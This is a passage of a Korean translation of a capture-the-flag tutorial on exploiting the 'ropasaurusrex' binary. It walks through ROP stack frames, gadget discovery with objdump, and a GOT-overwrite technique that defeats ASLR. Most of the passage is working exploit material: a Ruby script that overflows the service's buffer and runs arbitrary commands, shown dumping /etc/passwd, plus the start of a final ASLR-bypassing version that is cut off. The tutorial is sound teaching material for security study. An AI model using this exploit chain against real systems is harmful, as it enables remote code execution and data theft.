<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 시작
</span><span class='line'>|      void *arg       |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   | &lt;-- 스택 포인터
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret의 프레임
</span><span class='line'>| [address of system]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 시작
</span><span class='line'>|     size_t count     |
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       |
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        |
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of "pppr"]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p><code>pop/pop/pop/ret</code>은 <code>objdump</code>를 이용하면 어렵지 않게 찾을 수 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>objdump -d ./ropasaurusrex <span class="p">|</span> egrep <span class="s1">&#39;pop|ret&#39;</span>
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'> 80484b5:       5b                      pop    ebx
</span><span class='line'> 80484b6:       5e                      pop    esi
</span><span class='line'> 80484b7:       5f                      pop    edi
</span><span class='line'> 80484b8:       5d                      pop    ebp
</span><span class='line'> 80484b9:       c3                      ret
</span></code></pre></td></tr></table></div></figure>


<p>이건 다음 함수를 실행할 때 1~4개의 인자를 스택에서 지울 수 있게 해준다. 완벽하다!</p>

<p>그리고 이걸 직접 따라해 보고 있다면, pop들이 연속한 주소에 있어야 한다는 걸 기억해라. 그래서 <code>egrep</code>으로 찾는 것은 약간 위험하다.</p>

<p>이제 우리는 세 개의 <code>pop</code>과 <code>ret</code>이 필요하면 (<code>read()</code>가 사용한 세 개의 인자를 지우기 위해) 주소 <code>0x80484b6</code>을 사용하면 될 것이다. 그러면 스택은 이렇게 될 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 시작
</span><span class='line'>|      void *arg       | - 0x08049530 (buf)
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   | - 0x44444444
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of system]  | - 0xb7ec2450
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 시작
</span><span class='line'>|     size_t count     | - strlen(cmd)
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       | - 0x08049530 (buf)
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        | - 0 (stdin)
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of "pppr"]  | - 0x080484b6
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p>원격 서버에서 보내는 걸 받기 위해 <code>s.read()</code>를 익스플로잇 마지막에 추가하자. 현재 익스플로잇은 다음과 같다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># The command we&#39;ll run</span>
</span><span class='line'><span class="n">cmd</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># From objdump -x</span>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span> <span class="mh">0x08049530</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep read</span>
</span><span class='line'><span class="n">read_addr</span> <span class="o">=</span> <span class="mh">0x0804832C</span>
</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep write</span>
</span><span class='line'><span class="n">write_addr</span> <span class="o">=</span> <span class="mh">0x0804830C</span>
</span><span class='line'><span class="c1"># From gdb, &quot;x/x system&quot;</span>
</span><span class='line'><span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0xb7ec2450</span>
</span><span class='line'><span class="c1"># From objdump, &quot;pop/pop/pop/ret&quot;</span>
</span><span class='line'><span class="n">pppr_addr</span> <span class="o">=</span> <span class="mh">0x080484b6</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Generate the payload</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
</span><span class='line'>  <span class="o">[</span>
</span><span class='line'>    <span class="c1"># system()&#39;s stack frame</span>
</span><span class='line'>    <span class="n">buf</span><span class="p">,</span>         <span class="c1"># writable memory (cmd buf)</span>
</span><span class='line'>    <span class="mh">0x44444444</span><span class="p">,</span>  <span class="c1"># system()&#39;s return address</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># pop/pop/pop/ret&#39;s stack frame</span>
</span><span class='line'>    <span class="n">system_addr</span><span class="p">,</span> <span class="c1"># pop/pop/pop/ret&#39;s return address</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># read()&#39;s stack frame</span>
</span><span class='line'>    <span class="n">cmd</span><span class="o">.</span><span class="n">length</span><span class="p">,</span>  <span class="c1"># number of bytes</span>
</span><span class='line'>    <span class="n">buf</span><span class="p">,</span>         <span class="c1"># writable memory (cmd buf)</span>
</span><span class='line'>    <span class="mi">0</span><span class="p">,</span>           <span class="c1"># stdin</span>
</span><span class='line'>    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># read()&#39;s return address</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">read_addr</span> <span class="c1"># Overwrite the original return</span>
</span><span class='line'>  <span class="o">].</span><span class="n">reverse</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I*&quot;</span><span class="p">)</span> <span class="c1"># Convert a series of &#39;ints&#39; to a string</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Write the &#39;exploit&#39; payload</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># When our payload calls read() the first time, this is read</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Read the response from the command and print it to the screen</span>
</span><span class='line'><span class="nb">puts</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">read</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Clean up</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>그리고 실행하게 되면, 예상대로 나온다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;cat /etc/passwd&quot;</span>
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>...
</span></code></pre></td></tr></table></div></figure>


<p>그리고 <a href="https://en.wikipedia.org/wiki/Core_dump">코어 덤프</a>를 보면, 예상한 대로 <code>0x44444444</code>에서 크래시를 일으킨다.</p>

<p>끝났다, 그렇지?</p>

<p>실은 틀렸다!</p>

<p>이 익스플로잇은 내 테스트 기기에서 완벽하게 작동하지만, ASLR이 적용되었다면 실패한다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>sudo sysctl -w kernel.randomize_va_space<span class="o">=</span>1
</span><span class='line'>kernel.randomize_va_space <span class="o">=</span> 1
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;cat /etc/passwd&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>여기서부터 조금 더 복잡해진다. 가보자!</p>

<h2><a id="what-is-aslr"></a>ASLR이 뭐야?</h2>

<p>ASLR&mdash;주소 공간 레이아웃 불규칙화(address space layout randomization)&mdash;은 현대 시스템(FreeBSD는 제외)에 구현된 방어 기법으로, 라이브러리가 로드 되는 주소를 불규칙화 한다. 그 예로, ropasaurusrex를 두 번 실행하고 <code>system()</code>의 주소를 알아내 보자:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s1">&#39;printf &quot;A&quot;x1000&#39;</span> <span class="p">|</span> ./ropasaurusrex
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x41414141 in ?? ()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x system
</span><span class='line'>0xb766e450 &lt;system&gt;:    0x890cec83
</span><span class='line'>
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s1">&#39;printf &quot;A&quot;x1000&#39;</span> <span class="p">|</span> ./ropasaurusrex
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x41414141 in ?? ()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x system
</span><span class='line'>0xb76a7450 &lt;system&gt;:    0x890cec83
</span></code></pre></td></tr></table></div></figure>


<p><code>system()</code>의 주소가 <code>0xb766e450</code>에서 <code>0xb76a7450</code>으로 바뀐 것을 보라. 이게 문제다!</p>

<h2><a id="defeating-aslr"></a>ASLR 정복</h2>

<p>그래서, 뭘 해야 할까? 사실, 바이너리 자체는 ASLR이 적용되지 않아서, 유용하게도 거기 있는 모든 주소는 그대로 머물러 있다고 믿을 수 있다. 아주 중요하게도, 재배치(relocation) 테이블은 같은 주소에 남아있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>objdump -R ./ropasaurusrex
</span><span class='line'>
</span><span class='line'>./ropasaurusrex:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>DYNAMIC RELOCATION RECORDS
</span><span class='line'>OFFSET   TYPE              VALUE
</span><span class='line'>08049600 R_386_GLOB_DAT    __gmon_start__
</span><span class='line'>08049610 R_386_JUMP_SLOT   __gmon_start__
</span><span class='line'>08049614 R_386_JUMP_SLOT   write
</span><span class='line'>08049618 R_386_JUMP_SLOT   __libc_start_main
</span><span class='line'>0804961c R_386_JUMP_SLOT   <span class="nb">read</span>
</span></code></pre></td></tr></table></div></figure>


<p>이렇게 <code>read()</code>와 <code>write()</code>의 주소&mdash;바이너리 안에 있는&mdash;를 알게 되었다. 이게 뭘 의미하느냐? 바이너리가 실행 중일 때 이들의 값을 살펴보자:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>gdb ./ropasaurusrex
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run
</span><span class='line'>^C
</span><span class='line'>Program received signal SIGINT, Interrupt.
</span><span class='line'>0xb7fe2424 in __kernel_vsyscall <span class="o">()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x 0x0804961c
</span><span class='line'>0x804961c:      0xb7f48110
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> print <span class="nb">read</span>
</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7f48110 &lt;<span class="nb">read</span>&gt;
</span></code></pre></td></tr></table></div></figure>


<p>보라.. <code>read()</code>를 가리키는 포인터가 우리가 알고 있는 메모리 주소에 있다! 이걸로 뭘 할지 궁금한가&hellip;? 힌트를 하나 주겠다: 우리는 <code>write()</code> 함수&mdash;주소를 아는 또 하나의 함수&mdash;를 사용해 임의의 메모리에서 데이터를 가져와 소켓에 쓸 수 있다.</p>

<h2><a id="finally-running-some-code"></a>드디어, 코드 실행!</h2>

<p>좋다, 잠깐 멈추고, 단계를 나누자. 우리는 이와 같은 과정이 필요하다:</p>

<ol>
<li><code>read()</code> 함수를 이용해 명령어를 메모리에 복사</li>
<li><code>write()</code> 함수를 이용해 <code>write()</code> 함수의 주소 구하기</li>
<li><code>system()</code> 주소를 구하기 위해 <code>write()</code>과 <code>system()</code>의 오프셋 계산</li>
<li><code>system()</code> 호출</li>
</ol>


<p><code>system()</code>을 호출하려면, <code>system()</code>의 주소를 메모리 어딘가에 쓰고, 그걸 호출해야 한다. 가장 쉬운 방법은 <code>.plt</code> 테이블의 <code>read()</code> 호출을 덮어쓰고 <code>read()</code>를 호출하는 것이다.</p>

<p>지금 아마도 조금 혼란스러울 것이다. 하지만 나도 그랬으니 걱정하지 마라. 난 이게 된다는 사실에 충격받았다. :)</p>

<p>잠시 멈추고 이걸 이해해 보자! 이건 우리가 원하는 스택 프레임일 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 [7]
</span><span class='line'>|      void *arg       |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret의 프레임 [6]
</span><span class='line'>|  [address of read]   | - 사실은 system()으로 점프할 것이다.
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- 두 번째 read()의 프레임 [5]
</span><span class='line'>|     size_t count     | - 4바이트 (32비트 주소의 크기)
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       | - read()를 가리키는 덮어쓸 수 있는 포인터
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        | - 0 (stdin)
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of "pppr"]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret의 프레임 [4]
</span><span class='line'>|  [address of read]   |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- write()의 프레임 [3]
</span><span class='line'>|     size_t count     | - 4바이트 (32비트 주소의 크기)
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       | - read()를 가리키는 포인터를 포함하는 주소
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        | - 1 (stdout)
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of "pppr"]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret의 프레임 [2]
</span><span class='line'>|  [address of write]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 [1]
</span><span class='line'>|     size_t count     | - strlen(cmd)
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       | - 쓸 수 있는 메모리
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        | - 0 (stdin)
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of "pppr"]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p>오 이런, 이게 대체 뭐야?</p>

<p>바닥에서 시작해서 올라가자! 말하기 쉽게 각 프레임에 숫자를 붙였다.</p>

<p>프레임 [1]은 전에 본 것이다. <code>cmd</code>를 쓸 수 있는 메모리에 기록한다. 프레임 [2]는 <code>read()</code>를 정리할 표준적인 <code>pop/pop/pop/ret</code>을 사용한다.</p>

<p>프레임 [3]은 <code>write()</code>를 사용해 소켓에 <code>read()</code> 주소를 쓴다. 프레임 [4]는 <code>write()</code> 후 정리할 표준적인 <code>pop/pop/pop/ret</code>을 사용한다.</p>

<p>프레임 [5]는 소켓을 통해 다른 주소를 읽고 그걸 메모리에 쓴다. 이 주소는 <code>system()</code> 호출 주소가 될 것이다. 이걸 메모리에 쓰는 게 작동하는 이유는 <code>read()</code>가 호출되는 방식 때문이다. 우리가 gdb (<code>0x0804832C</code>)에서 써 왔던 <code>read()</code> 호출 부분을 보면 이렇다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/i 0x0804832C
</span><span class='line'>0x804832c &lt;<span class="nb">read</span>@plt&gt;:   jmp    DWORD PTR ds:0x804961c
</span></code></pre></td></tr></table></div></figure>


<p><code>read()</code>는 사실 간접적인 점프로 구현되어 있다! 그러니 <code>ds:0x804961c</code>의 값이 무엇이든 이걸 바꿔도 그리로 점프하게 되고, 결국 우린 어디로든 점프할 수 있게 된다! 그래서 프레임 [3]에서 메모리로부터 주소를 읽고 (<code>read()</code>의 실제 주소를 얻기 위해) 프레임 [5]에서 그 주소에 새 주소를 쓰는 것이다.</p>

<p>프레임 [6]은 표준적인 <code>pop/pop/pop/ret</code> 구조지만 약간 다르다: <code>pop/pop/pop/ret</code>의 반환 주소가 실제론 <code>read()</code>의 <code>.plt</code> 엔트리인 <code>0x804832c</code>다. <code>read()</code>의 <code>.plt</code> 엔트리를 <code>system()</code>으로 덮어쓰기 때문에, 이 호출은 실제로 <code>system()</code>으로 가게 된다!</p>

<h2><a id="final-code"></a>최종 코드</h2>

<p>휴! 꽤 복잡했다. DEP와 ASLR을 모두 우회하며 ropasaurusrex의 익스플로잇을 모두 구현한 코드다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># The command we&#39;ll run</span>
</span><span class='line'><span class="n">cmd</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># From objdump -x</span>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span> <span class="mh">0x08049530</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep read</span>
</span><span class='line'><span class="n">read_addr</span> <span class="o">=</span> <span class="mh">0x0804832C</span>
</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep write</span>
</span><span class='line'><span class="n">write_addr</span> <span class="o">=</span> <span class="mh">0x0804830C</span>
</span><span class='line'><span class="c1"># From gdb, &quot;x/x system&quot;</span>
</span><span class='line'><span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0xb7ec2450</span>
</span><span class='line'><span class="c1"># Fram objdump, &quot;pop/pop/pop/ret&quot;</span>
</span><span class='line'><span class="n">pppr_addr</span> <span class="o">=</span> <span class="mh">0x080484b6</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># The location where read()&#39;s .plt entry is</span>
</span><span class='line'><span class="n">read_addr_ptr</span> <span class="o">=</span> <span class="mh">0x0804961c</span>
</span><span class='line'>
